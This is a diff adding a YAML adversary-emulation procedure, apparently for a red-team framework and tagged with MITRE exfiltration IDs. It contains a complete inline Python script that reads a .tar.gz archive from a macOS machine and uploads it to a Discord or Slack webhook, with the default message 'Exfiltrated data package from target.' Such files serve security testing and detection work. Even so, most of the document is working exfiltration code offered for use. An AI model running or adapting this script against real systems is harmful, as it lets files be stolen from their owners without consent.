@@ -1,0 +1,94 @@
+---
+api_version: 2.0
+uuid: 1e8a2c7b-9f0d-4a1e-8b3c-5d6f7a0e9c4d
+name: exfiltrate-archive-via-webhook
+authors:
+  - godlovepenn
+description: |
+  Exfiltrates a pre-existing .tar.gz archive from a macOS endpoint to a
+  specified webhook URL (e.g., Discord, Slack). This TTP uses a Python 3
+  script with only native libraries (urllib) to perform the upload, making
+  it portable on systems without third-party dependencies like 'requests'.
+
+mitre:
+  tactics:
+    - "TA0010 Exfiltration"
+  techniques:
+    - "T1567 Exfiltration Over Web Service"
+
+requirements:
+  platforms:
+    - os: darwin
+  superuser: false
+
+args:
+  - name: webhook_url
+    description: The full URL for the messaging platform's incoming webhook.
+    type: string
+    default: "https://your-webhook-url-here"
+  - name: archive_file_path
+    description: The full path to the local compressed .tar.gz file to be exfiltrated.
+    type: path
+    default: "archived-docs.tar.gz"
+  - name: upload_message
+    description: The text message to send along with the uploaded file.
+    type: string
+    default: "Exfiltrated data package from target."
+
+steps:
+  - name: exfiltrate_archive_via_python
+    executor: python3
+    inline: |
+      import os, sys, json, uuid, mimetypes
+      import urllib.request, urllib.error
+
+      # --- Configuration from TTP args ---
+      ARCHIVE_FILE_PATH = "{{.Args.archive_file_path}}"
+      WEBHOOK_URL = "{{.Args.webhook_url}}"
+      MESSAGE = "{{.Args.upload_message}}"
+
+      if not os.path.exists(ARCHIVE_FILE_PATH):
+          print(f"Error: file not found: {ARCHIVE_FILE_PATH}", file=sys.stderr)
+          sys.exit(1)
+
+      boundary = f"----------{uuid.uuid4().hex}"
+      crlf = b"\r\n"
+      parts = []
+
+      # payload_json
+      parts.append(f"--{boundary}".encode())
+      parts.append(b'Content-Disposition: form-data; name="payload_json"')
+      parts.append(b"")
+      parts.append(json.dumps({"content": MESSAGE}).encode("utf-8"))
+
+      # file
+      filename = os.path.basename(ARCHIVE_FILE_PATH)
+      mtype = (mimetypes.guess_type(ARCHIVE_FILE_PATH)[0]) or "application/octet-stream"
+      parts.append(f"--{boundary}".encode())
+      parts.append(f'Content-Disposition: form-data; name="files[0]"; filename="{filename}"'.encode())
+      parts.append(f"Content-Type: {mtype}".encode())
+      parts.append(b"")
+      with open(ARCHIVE_FILE_PATH, "rb") as f:
+          parts.append(f.read())
+
+      # closing boundary
+      parts.append(f"--{boundary}--".encode())
+      parts.append(b"")
+
+      body = crlf.join(parts)
+      headers = {
+          "Content-Type": f"multipart/form-data; boundary={boundary}",
+          "Content-Length": str(len(body)),
+          "User-Agent": "python-urllib/3 webhook-uploader",
+      }
+
+      req = urllib.request.Request(WEBHOOK_URL, data=body, headers=headers, method="POST")
+      try:
+          with urllib.request.urlopen(req) as resp:
+              print(f"OK: {resp.status}")
+      except urllib.error.HTTPError as e:
+          print(f"HTTP {e.code}: {e.read().decode('utf-8', 'replace')}", file=sys.stderr)
+          sys.exit(1)
+      except Exception as e:
+          print(f"Error: {e}", file=sys.stderr)
+          sys.exit(1)
